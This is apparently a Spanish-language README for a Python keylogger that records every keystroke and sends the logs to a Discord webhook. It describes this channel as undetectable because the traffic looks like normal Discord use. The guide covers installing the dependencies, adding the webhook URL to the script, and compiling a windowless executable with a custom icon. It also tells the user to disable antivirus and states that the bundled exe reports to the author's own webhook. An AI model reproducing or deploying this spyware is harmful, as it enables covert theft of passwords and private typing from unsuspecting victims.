<p align="Left">
  <a href="" rel="noopener">
 <img width=650px height=200px src="https://imgur.com/inEdzeP.png" alt="Project logo"></a>
</p>

<h1 align="left"> Keylogger que reporta a Discord </h1>


Este script de python capturara todas las teclas apretadas durante una ventana de tiempo predefinida y las reportara a un servidor de Discord por medio de Webhooks. a diferencia de los metodos tradicionales como "Guardar en un txt" o "Enviar a un email", este metodo permanece indetectado ya que los request de webhook son considerados trafico normal de Discord.


## Deployment

- Tener Python instalado en su maquina, descargar el lenguaje desde [aca](https://www.python.org/downloads/).
- Crear una cuenta de discord, como hacerlo [aca](https://youtu.be/dinlzJlzIB4)

## Instalar librerias requeridas
```
python -m pip install -r requirements.txt
```

## Crear un servidor de Discord

Puedes usar [este](https://support.discord.com/hc/en-us/articles/204849977-How-do-I-create-a-server-) articulo para ver como hacerlo.

## Crear un Discord Webhook

Ingresa a la configuracion del servidor y selecciona Intergrations >>  Webhooks y crear un nuevo Webhook, se lo puede customizar y darle un nombre y un icono. Es necesario copiar al URL del webhook.

![screenshot1](https://imgur.com/CuLnE5c.png)

![screenshot2](https://imgur.com/24A58iM.png)

![screenshot3](https://i.imgur.com/i084ESb.png)

## Editar keylogger.py

Ahora que poseemos el webhook podemos editar el script en python. Debemos añadir la url al archivo y asegurarnos de colocar el timeframe en el cual deseamos que el kelogger haga los reportes. 

```Python
import keyboard,os
from threading import Timer
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed

SEND_REPORT_EVERY = "TIEMPO_EN_SEGUNDOS_ACA" # Este sin comillas 
WEBHOOK = "URL_DEL_WEBHOOK_ACA"
```

## Ejecutar el script

Una vez hecho eso, podremos ejecutar el script correctamente.
Para ejecutar el script solo debemos colocar esto en la terminal:
```
python keylogger.py
```
si todo sale bien deberiamos ver el reporte en discord despues de esperar el tiempo establecido.
![c2](https://imgur.com/MxKQE7n.png)

## Compilar el script

Para convertir el archivo en un ejecutable necesitaremos la libreria  pyinstaller que fue incluida en el archivo requirements.txt.
Debemos abrir una terminal en el directorio donde se encuentre el archivo.
```
pyinstaller keylogger.py --onefile --noconsole
```
Por si desea un icono custom para el exe.
```
pyinstaller keylogger.py --onefile --noconsole --icon=ejemplo.ico
```

# Instalador

Si se desea crear un instalador para el programa podemos seguir [este](https://www.youtube.com/watch?v=cVN62zhiNH0&t=519s) tutorial


# Notas
- (Es necesario desactivar el windows defender/antivirus para probrar el programa)
- (El exe incluido en este repositorio posee un webhook propio por lo que si lo ejecutan yo recibire los reportes)

